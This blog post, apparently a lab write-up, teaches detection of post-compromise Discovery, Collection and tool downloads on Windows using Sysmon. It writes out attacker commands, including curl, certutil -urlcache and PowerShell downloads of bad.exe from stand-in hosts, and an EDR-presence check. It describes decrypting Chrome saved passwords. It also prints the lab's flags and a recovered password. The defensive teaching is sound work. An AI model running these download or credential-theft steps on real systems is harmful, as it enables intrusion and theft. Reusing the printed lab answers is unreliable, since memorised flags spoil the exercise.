---

title: Windows Threat Detection 2

date: 2026-07-26 14:00 +0300

categories: [Foundations, Windows]

tags: [windows, discovery, collection, exfiltration, sysmon]

description: "How attackers map an environment after Initial Access, what they steal and archive once they find it, and how certutil, curl, and PowerShell each leave a different trail when pulling in more tools, all traced through Sysmon."

---

## Description

"Windows Threat Detection 2" is the third post in this series, and it picks up the moment Windows Threat Detection 1 leaves off: the attacker is already inside. This room covers what happens next when a threat actor skips the quiet backdoor route and goes straight for the objective, walking through Discovery, Collection, and Ingress Tool Transfer, three stages that show up in nearly every breach regardless of how the attacker originally got in.

The room runs five practice scenarios: a manual `net user` and Sysmon lookup, a phishing-delivered executable (`invoice.pdf.exe`) running Discovery commands, a hands-on Collection exercise against browser passwords and SSH keys, a standalone data stealer sample (`stealer.exe`), and four separate Ingress Tool Transfer methods against the same test file. Every answer below came from working through each scenario on the lab VM, matched against the room's confirmed answers.

The Logon ID and ProcessId correlation habits from the first two posts in this series carry forward again here, this time extended into building full process trees from Sysmon Event ID 1 alone, correlating ProcessId to ParentProcessId across every command an attacker runs after the front door opens.

## The problem

Getting into a network and knowing what to do once inside are two entirely different skills, and most Initial Access techniques hand an attacker neither. A phishing attachment or a brute-forced RDP session drops someone into a completely unfamiliar environment with no map of what's valuable, who else is watching, or what security tools might shut them down. Before an attacker can steal anything or cause damage, they have to answer the same two questions anyone does waking up somewhere unfamiliar: who am I, and where am I.

That's Discovery (TA0007), and it's a genuinely difficult tactic to detect. MITRE catalogs roughly 49 Discovery techniques and sub-techniques, and the overwhelming majority of them use tools already sitting on every Windows machine: `whoami`, `net user`, `systeminfo`, `ipconfig`, `tasklist`. An IT administrator runs every one of these commands routinely, which means the commands themselves carry almost no signal. Detection has to lean on context instead, who ran it, from what parent process, and how many of these commands fired in how short a window.

| Discovery purpose | MITRE technique | Common commands |
|---|---|---|
| Files and folders | T1083, File and Directory Discovery | `dir`, `Get-ChildItem`, `type`, `Get-Content` |
| Users and groups | T1069, Permission Groups Discovery | `whoami`, `net user`, `net localgroup`, `query user` |
| System and apps | T1082 / T1057, System Information / Process Discovery | `systeminfo`, `tasklist /v`, `wmic product get` |
| Network settings | T1016 / T1049, Network Configuration / Connections Discovery | `ipconfig /all`, `netstat -ano` |
| Active antivirus | T1518.001, Security Software Discovery | WMI query against `root\SecurityCenter2` |

The most reliable signal in this entire tactic isn't any single command. It's the sequence. A human sitting at a keyboard checks one or two of these things and moves on. Malware or an attacker working from a script runs several in immediate succession: `whoami`, then `systeminfo`, then `ipconfig`, then a users-and-groups check, all within seconds. No legitimate admin workflow looks like that, which makes the burst itself the detection.

None of this works without the command-line arguments actually being logged, the same advanced-audit-policy dependency covered in the first room of this series. Sysmon Event ID 1 captures the full command line by default, which is exactly why this room leans on Sysmon rather than the Security log's 4688, since 4688 needs a separate policy toggle just to include arguments at all, and plenty of environments never flip it.

## How it works

**Step 1: Confirm the discovery-to-Sysmon pipeline works before hunting for an attacker**

The room opens with a deliberately simple exercise: run `net user Administrator` yourself, then go find it in the logs. It's a small step, but it confirms the entire pipeline this room depends on actually functions before pointing it at something malicious.

| Action | Where it shows up |
|---|---|
| Run `net user Administrator` in CMD | Output shows `Local Group Memberships`, here `*Administrators` |
| Same command in Sysmon | Event ID 1 (Process Create), `Image` field reads `C:\Windows\System32\net.exe` |

That `Image` field matters more than it looks. `net.exe` living at its default System32 path is exactly what a legitimate invocation looks like. The moment `net.exe` shows up running from `C:\Temp` or `C:\Users\Public` instead, the path itself becomes the red flag, independent of anything in the command line.

The same `Get-WinEvent` habit from both earlier posts in this series applies to every scenario below, just aimed at new event IDs.

| Task | Command pattern |
|---|---|
| Every process creation event tied to a specific parent | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} \| Where-Object {$_.Message -match 'invoice.pdf.exe'}` |
| DNS queries from a specific process | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=22}` |
| File creation events for a staging directory | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=11} \| Where-Object {$_.Message -match 'staging_'}` |
| Network connections from a LOLBin | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=3} \| Where-Object {$_.Message -match 'certutil'}` |

**Step 2: Reconstruct a Discovery burst from a phishing payload's process tree**

`invoice.pdf.exe`, the same double-extension trick covered in the previous room, doesn't just get a foothold and wait. It immediately starts asking the two questions every attacker asks first, and the process tree it spawns shows the order clearly.

| Level | Process | Purpose |
|---|---|---|
| Root | `invoice.pdf.exe` | The phishing payload itself |
| Child | `cmd.exe` | Spawns the classic recon commands |
| Grandchild | `ipconfig`, `whoami /priv`, `net user`, `tasklist /v` | Network, identity, users, running software |
| Child | `powershell.exe` | Spawns PowerShell-native recon |
| Grandchild | `Get-Service`, `Get-MpPreference` | Service enumeration, Defender configuration check |

Filtering Sysmon Event ID 1 for `invoice.pdf.exe` as `ParentImage` and reading the first child process in order surfaces `whoami` as the very first command executed, before any of the network or user-enumeration commands. That ordering matches the discovery-burst pattern almost exactly: identity first, environment second.

The malware doesn't stop at generic recon. Continuing down the same process tree surfaces a specific defensive-evasion check: `cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"`. `MsSense.exe` is the process name for Microsoft Defender for Endpoint's sensor, so this single line answers a very targeted question, is the enterprise-grade EDR installed, or just consumer Defender, before deciding whether to continue the attack at all. This is `T1518.001`, Security Software Discovery, in its most direct form: checking the defenses before doing anything that might get caught.

Once the malware finishes its recon, it phones home with what it found. Filtering Sysmon Event ID 22 (DNS Query) for the same process surfaces the destination: `exfil.beecz.cafe`, a domain with no legitimate reason to exist, built to look disposable and forgettable.

**Step 3: Recognize Discovery that never touches a command line at all**

Attackers with interactive access, an RDP session in particular, aren't limited to typing commands. Nothing stops them from clicking through the same GUI tools any admin uses.

| GUI action | Process tree signature |
|---|---|
| Open Computer Management | `mmc.exe C:\Windows\system32\compmgmt.msc`, parent `explorer.exe` |
| List network adapters | `control.exe netconnections` |
| Open Settings | `SystemSettings.exe`, launched from `ImmersiveControlPanel` |
| Read a file | `notepad.exe C:\...\secrets.txt` |
| Check running processes visually | `taskmgr.exe` |

None of these commands look anything like `whoami` or `net user`, which is exactly the trap. An analyst trained to hunt only for classic command-line Discovery strings misses this entirely. The tell here is the parent process: every one of these tools launching directly under `explorer.exe`, at a time correlated to a known malicious Logon ID from Security logs, is the same Discovery activity wearing a different outfit. The correlation habit from the first two rooms in this series, checking parent-child relationships and matching Logon IDs across log sources, is what catches GUI-based recon that a keyword search on command lines would miss completely.

**Step 4: Know what attackers actually go looking for once they understand the environment**

Once an attacker has their bearings, Discovery turns into Collection, and the targets follow the attacker's motive rather than any fixed list.

| Attacker goal | Typical targets |
|---|---|
| Blackmail or extortion | Photos, chat history, browser history |
| Direct financial theft | Crypto wallets, saved banking sessions, browser cookies |
| Corporate access and ransomware | SSH keys, database files, network documentation |

Some of these targets sit in predictable, well-documented file paths, which is exactly why both attackers and defenders know precisely where to look.

| Goal | Example path |
|---|---|
| Personal data | `AppData\Roaming\Signal\*`, Chrome browsing history |
| Financial theft | `AppData\Roaming\Bitcoin\wallet.dat`, Chrome cookies |
| Corporate data | `.ssh\*`, SQL Server data directories |

Chrome's saved-password feature is a frequent target because of exactly how accessible it is once an attacker has a foothold. Chrome stores credentials in a SQLite database at `AppData\Local\Google\Chrome\User Data\Default\Login Data`, and the stored password can be recovered by querying that database and passing the result through the Windows API function `CryptUnprotectData`, which decrypts it using the victim's own cached login as the key. No password cracking involved, just a locally available API doing exactly what it was built to do. Manually walking through the room's Chrome password manager surfaces the saved Facebook credential: `nsAghv51BBav90!`, exactly the kind of secret this technique, `T1555.003`, Credentials from Web Browsers, is built to pull.

The rest of the Collection exercise plays out the same way, methodically checking known-valuable locations. `C:\Users\Administrator\.ssh`, a hidden folder that needs "Show hidden items" enabled to even see, holds a private key named `thm-access-database.key`, precisely the kind of file `T1552.004`, Unsecured Credentials: Private Keys, exists to describe: a key that grants access to something else entirely, sitting unencrypted on disk. Checking Desktop, Downloads, and Documents in turn for anything matching the room's corporate-espionage angle surfaces `thm-network-diagram-2025.pdf`, internal network documentation that would hand an attacker a head start on lateral movement in a real intrusion.

**Step 5: Detect Collection through the same command patterns as Discovery, aimed at files instead of settings**

Collection commands look structurally similar to Discovery commands. The difference is what they're pointed at: specific, named files and folders instead of general system state.

| Command pattern | What it indicates |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Manual review of a specific sensitive file |
| `type debug-logs.txt \| findstr password` | Searching file content for a keyword |
| `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Bulk search for a file type across a user's profile |
| `Compress-Archive` or `7za.exe a -tzip` | Staging collected files into a single archive before exfiltration |

That last row, archiving, is `T1560`, Archive Collected Data, and it's worth understanding past the room's simplified example. Real intrusions using 7-Zip on the command line frequently add flags well beyond a basic zip: `-mhe=on` encrypts the archive's file headers so even the filenames inside stay hidden from inspection, and `-v500m` splits a large archive into 500MB volumes to slip past size-based exfiltration alerts. PowerShell's own `Compress-Archive` cmdlet, notably, has no built-in encryption option at all, which is precisely why attackers using it often pair it with a second step to encrypt what they just staged. A cluster of Notepad and Wordpad processes opening financial and text documents, immediately followed by a 7-Zip invocation bundling them together, is a documented real-world pattern behind actual incident response cases, not a room-only fabrication: manual, human-driven Collection followed by archiving, all visible as Sysmon Event ID 1 process creation events.

**Step 6: Analyze a standalone data stealer and map its behavior to the same techniques**

Not every Collection scenario involves a human attacker manually browsing folders. `stealer.exe` represents the far more common case for attacks against ordinary workstations: a single automated binary that does Discovery, Collection, and Exfiltration back to back with no interactive commands at all.

Running the sample and watching Sysmon confirms the pattern directly. The malware creates a staging directory named `staging_58f1`, a randomized name meant to blend in and be forgettable, then searches specifically for `docx`, `pdf`, and `xlsx` files, exactly the extensions most likely to hold something worth stealing on a typical workstation. It also pulls live clipboard contents via the `Get-Clipboard` PowerShell cmdlet, a detail worth flagging on its own, since clipboard theft catches whatever a user copied moments ago: a password, a crypto wallet address, a one-time code. Finally, it exfiltrates everything it collected to `collecteddata-storage-2025.s3.amazonaws.com`, an Amazon S3 bucket rather than a custom command-and-control server.

That choice of destination is deliberate and well-documented in real malware. `T1567.002`, Exfiltration to Cloud Storage, exists specifically because services like Amazon S3, Dropbox, and MEGA blend into normal enterprise network traffic that security tools already trust. Akira ransomware affiliates favor the tool Rclone precisely for this reason, since it can sync stolen data to S3, Dropbox, Google Drive, and MEGA simultaneously, spreading the exfiltration across multiple trusted destinations at once. The room's simplified stealer follows the same logic on a smaller scale.

Commodity infostealers sold on criminal Telegram channels behave almost identically to this sample. One widely documented C# stealer, publicly analyzed after emerging on underground forums in 2025, targets browser passwords and cookies, cryptocurrency wallets, VPN and FTP credentials, and Discord and Telegram session data, packages everything into a ZIP archive, and uploads it to an attacker-controlled server for resale.

| Behavior | Room's `stealer.exe` | Real-world infostealer |
|---|---|---|
| Staging | Randomized folder name (`staging_58f1`) | Plaintext files under `LOCAL_APP_DATA` |
| Targets | `.docx`, `.pdf`, `.xlsx` files, clipboard | Browser cookies, crypto wallets, VPN/FTP creds, Discord/Telegram |
| Packaging | Implied archive before exfiltration | ZIP archive named after the victim's public IP |
| Exfiltration | S3 bucket | Attacker-hosted web panel and Telegram bot |

The room's practice sample walks through the exact same staging-then-exfiltrate shape in miniature, minus the added evasion tricks real stealers use to bypass modern browser cookie protections.

**Step 7: Trace Ingress Tool Transfer across every method an attacker might use to bring in more tools**

Attackers rarely arrive with every tool they'll eventually need. A phishing attachment or a bare RDP session is often deliberately minimal, both to slip past filtering and to limit what's exposed if the operation gets caught early. Whatever gets downloaded afterward, a recon script, a credential-dumping tool, a full RAT, falls under `T1105`, Ingress Tool Transfer, a technique that sits under the Command and Control tactic rather than Discovery or Collection, since it's fundamentally about pulling something in from outside.

| Transfer method | Command | Detection angle |
|---|---|---|
| Web browser | Direct navigation to the URL | Browser process making an outbound connection to an unfamiliar domain |
| curl | `curl.exe https://blackhat.thm/bad.exe -o good.exe` | `curl.exe` launched from `cmd.exe`, unusual for most environments |
| certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` | A certificate utility making an HTTP request, never its intended purpose |
| PowerShell IWR | `Invoke-WebRequest -Uri '...' -OutFile 'good.exe'` | PowerShell process with outbound network activity and a file write |

Working through all four methods against the same test file in the room, browsing directly to `http://appsforfree.thm/trojan.exe` in Chrome, downloading via `curl.exe`, via `certutil.exe -urlcache -f`, and via PowerShell's `Invoke-WebRequest`, returns four distinct flags: `THM{just_use_web_browser}`, `THM{curl_is_cool}`, `THM{abusing_certutil}`, and `THM{power_of_powershell}`. Each represents a genuinely different detection signature despite accomplishing the exact same thing.

`certutil` is worth calling out specifically, since it's a certificate management utility with zero legitimate reason to be fetching arbitrary files from the internet, which is precisely why it shows up constantly in real Ingress Tool Transfer detections as one of the most reliable LOLBins, a living-off-the-land binary, legitimate, Microsoft-signed software repurposed for something its designers never intended. Seeing `certutil.exe -urlcache` in a process creation log is close to an automatic red flag in most environments, since almost nothing legitimate calls it that way. `certutil` shows up again after the fact too: attackers frequently run `certutil -hashfile` on whatever they just downloaded to confirm it transferred intact before running it, a small verification step that leaves its own process creation event and its own opportunity to catch the activity.

The wider catalog of LOLBins used this way, `certutil`, `bitsadmin`, `expand.exe`, `esentutl.exe`, and dozens more, is documented and actively maintained by the public LOLBAS project specifically so defenders can build detection coverage against the full list rather than reinventing it one incident at a time. Treating any of these binaries making outbound network connections as inherently suspicious, since none of them are designed to do that under normal use, closes off an entire category of Ingress Tool Transfer without needing to know every individual malware family that abuses it.

**Step 8: Put Discovery, Collection, and Ingress Tool Transfer on one map**

Every scenario in this room maps to a distinct MITRE tactic, and running them in sequence shows how an attacker's actions naturally chain from one into the next.

| Tactic | Technique | Practice scenario | Primary log source |
|---|---|---|---|
| Discovery | T1033 / T1069 / T1518.001 | `invoice.pdf.exe` recon burst | Sysmon Event ID 1 |
| Collection | T1555.003, Credentials from Web Browsers | Facebook password in Chrome | Manual inspection |
| Collection | T1552.004, Unsecured Credentials: Private Keys | `thm-access-database.key` | Manual inspection |
| Collection | T1560, Archive Collected Data | `stealer.exe` staging directory | Sysmon Event ID 1/11 |
| Exfiltration | T1567.002, Exfiltration to Cloud Storage | S3 bucket callback | Sysmon Event ID 22 |
| Command and Control | T1105, Ingress Tool Transfer | Four download methods | Sysmon Event ID 1/3 |

Six techniques, four different MITRE tactics, one continuous chain. That's the actual shape of a breach after Initial Access: not a single dramatic action, but a sequence of small, individually unremarkable steps that only reads as an attack once the whole chain is visible at once.

**Step 9: Sketch a detection rule for the discovery burst and the collect-then-exfiltrate pattern**

The same habit from both earlier rooms applies here: write the correlation logic in plain language first. The Discovery burst becomes a single condition worth alerting on directly: three or more of `whoami`, `systeminfo`, `ipconfig`, `net user`, and `tasklist` executing from the same ParentProcessId within 30 seconds, especially when that parent isn't a known admin tool. The collect-then-exfiltrate pattern becomes a two-stage sequence: a Sysmon Event ID 11 creating an archive file (`.zip`, `.7z`, `.rar`) in a non-standard staging directory, followed within minutes by a Sysmon Event ID 3 network connection from that same process to a domain matching known cloud storage providers or an unfamiliar destination entirely. The Ingress Tool Transfer rule needs only one condition: any of `certutil.exe`, `bitsadmin.exe`, or `expand.exe` establishing a network connection at all, since legitimate use of any of them almost never does. Neither rule needs a threat feed. All three are direct translations of the process trees already walked through above.

## Why it matters

Initial Access gets the headlines, but Discovery, Collection, and Exfiltration are where a breach actually turns into a cost. A brute-forced RDP session that never leads to Discovery is a failed attack. The same session followed by a whoami-systeminfo-ipconfig burst, a search for financial PDFs, and a callback to an S3 bucket is a full-blown data breach, and the difference between those two outcomes is entirely visible in Sysmon if an analyst knows what to look for.

Three concrete scenarios show where this shows up in daily triage. An EDR alert fires on `tasklist /v` running from an unfamiliar parent process. Recognizing it as one command in a Discovery burst rather than a standalone event, and immediately pulling the full process tree by ParentProcessId, is the difference between closing it as noise and catching an active intrusion in its recon phase. Separately, a DLP tool flags a large outbound transfer to an unfamiliar S3 bucket. Tracing that connection back through Sysmon Event ID 22 and 1 to the process that made it, and from there to the staging directory it read from, turns a vague DLP alert into a complete incident timeline in minutes rather than hours. A third scenario ties Collection directly to business impact: a help desk ticket about a slow computer turns out, on inspection of Sysmon Event ID 1, to show a `net.exe` and `systeminfo.exe` burst an hour earlier, followed by 7-Zip archiving the user's Documents folder. Nothing about "slow computer" suggested a breach. The process tree told the real story.

The techniques in this room aren't advanced tradecraft reserved for nation-state actors. Commodity infostealers sold on criminal Telegram channels for a fraction of what enterprise tooling costs run this exact Discovery-Collection-Exfiltration chain automatically, on autopilot, against any workstation they land on. Ransomware affiliates run the same chain manually against corporate networks, just with a human instead of a script deciding what's worth stealing. An analyst who can read this entire chain from Sysmon alone, without a vendor's pre-built detection rule doing the work, catches both.

This closes the loop this series opened. Windows Logging for SOC taught which logs exist. Windows Threat Detection 1 taught how attackers get in. This room teaches what they do once they're there. Together, that's a complete kill chain, Initial Access through Exfiltration, covered entirely with the two log sources every Windows environment already has available: Security authentication events and Sysmon process telemetry.

The differentiator worth naming here is the same one that's run through every post in this series: none of it requires a paid detection stack to see. A discovery burst, a `certutil.exe -urlcache` invocation, an archive created seconds before an outbound connection, every one of these is visible in raw Sysmon output with nothing more than Event Viewer or a `Get-WinEvent` query. An analyst who can trace this entire chain unaided isn't just faster with a SIEM later. They understand what the SIEM's correlation rules are actually doing under the hood, which is the difference between running a tool and knowing why it works.

## Key takeaways

- Discovery is hard to detect on individual commands alone, since attackers use the same native tools IT admins use daily. The burst, several recon commands firing from one process within seconds, is the actual signal.
- Security Software Discovery, checking for MS Defender or other EDR before continuing an attack, is a deliberate decision point for real malware, not just a room exercise. Treat a `tasklist`-to-`findstr` check against known EDR process names as a serious red flag.
- GUI-based Discovery, launched from `explorer.exe` during an interactive session, leaves no `whoami`-style command line and needs parent-process correlation to catch, not command-line keyword searches.
- Chrome's saved passwords decrypt locally via a documented Windows API call. Treat any unexpected read of Chrome's `Login Data` file as a potential credential theft attempt.
- Archive creation immediately before a network connection, whether via 7-Zip or `Compress-Archive`, is the collect-then-exfiltrate pattern in its most common form.
- Ingress Tool Transfer has at least four common delivery methods on Windows alone: a browser, `curl`, `certutil`, and PowerShell. `certutil.exe -urlcache` in particular has almost no legitimate use case and is one of the highest-confidence LOLBin indicators available.